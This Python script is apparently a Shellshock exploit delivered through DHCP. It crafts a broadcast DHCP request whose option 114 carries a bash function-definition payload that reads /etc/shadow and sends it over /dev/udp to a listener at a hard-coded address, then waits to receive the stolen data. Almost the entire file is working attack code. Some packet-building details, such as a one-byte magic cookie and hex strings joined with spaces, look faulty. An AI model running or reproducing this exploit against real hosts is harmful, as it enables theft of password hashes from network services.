from binascii import hexlify
import socket
import select
import collections


def flatten_list(ze_list):
    for sublist in ze_list:
        if isinstance(sublist, collections.Iterable) and not isinstance(sublist, (str, bytes)):
            yield from flatten_list(sublist)
        else:
            yield sublist


class Client:
    def __init__(self):
        self.ip = b'192.168.110.23'
        print(self.ip)
        self.port = 8008
        self.exploit = hexlify(b"() { :;}; /usr/bin/cat /etc/shadow > /dev/udp/%b/%d" % (self.ip, self.port))
        self.exploit = [self.exploit[i:i + 2] for i in range(0, len(self.exploit), 2)]
        self.exploit_len = b'%x' % (len(self.exploit))
        self.dhcp_packet = self.craft_packet()

    def craft_packet(self):
        op = [b'01']  # REquest=ff or reply=00
        htype = [b'01']  # Hardware address type 01=ethernet
        hlen = [b'06']  # Hardware length
        hops = [b'00']  # hops; number of relay agents the message travels through, each one will add one
        xid = [b'00', b'00', b'17', b'3d']  # Transaction ID a random number chosen by the client to identify an ip address allocation
        secs = [b'00']*2  # number of seconds elapsed since clent sent a dhcp request
        flags = [b'00']*2  # leftmost bit is BROADCAST (B) flag, if 0 send back as unicast if 1 send back as broadcast
        ciaddr = [b'00']*4  # client ip address
        yiaddr = [b'00']*4  # 'your' ip address, as assigned by server
        siaddr = [b'00']*4  # Server ip address

        giaddr = [b'00']*4  # first relay agent ip address
        chaddr = [b'00', b'1b', b'52', b'01', b'fc', b'42']  # client hardware address
        chaddr_padding = [b'00']*(16-len(chaddr))
        sname = [b'00']*64  # server host name
        file = [b'00']*128  # bootfile name, routing information defined by server to the client
        magic_cookie = [b'00']
        options = [b'35', b'01', b'01',  # DHCP, len, Offer
                   b'3d', b'07', b'01', chaddr, # client id
                   b'37', b'04', b'01', b'03', b'06', b'2a',
                   b'72', self.exploit_len, self.exploit,
                   b'ff',  # end flag
                   # padding to end at word boundry for the options
                   ]

        options = list(flatten_list(options))

        options_padding_check = len(options)
        options_padding_length = 0
        while (options_padding_check / 4) != int(options_padding_check / 4):
            options_padding_check += 1
            options_padding_length += 1

        print(options_padding_length / 4)
        if options_padding_length > 1:
            options_padding = [[b'00'] * (options_padding_length - 1), [b'0a']]
            options_padding = list(flatten_list(options_padding))

            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr,chaddr_padding, sname,
                             file, magic_cookie, options, options_padding]

        else:
            return_packet = [op, htype, hlen, hops, xid, secs, flags, ciaddr, yiaddr, siaddr, giaddr, chaddr, chaddr_padding, sname,
                             file, magic_cookie, options]

        return_packet = [item for sublist in return_packet for item in sublist]
        return_packet = b' '.join(return_packet)
        return_packet = bytearray(return_packet)
        return return_packet

    def start_sockets(self):
        self.recv_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.recv_socket.bind(('', self.port))

        self.dhcp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.dhcp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)

    def start(self):
        self.dhcp_socket.sendto(self.dhcp_packet, ('255.255.255.255', 67))

        data = self.recv_socket.recv(10000)
        print(data)
        # while True:
        #     r, w, x = select.select([self.recv_socket, []], [], [])
        #     for each in r:
        #         print('Recieved Something!')
        #         frame, void = each.recvfrom(10000)
        #         print(frame)

    def test(self):
        print(self.dhcp_packet)
if __name__ == '__main__':
    client = Client()
    client.test()
    client.start_sockets()
    client.start()

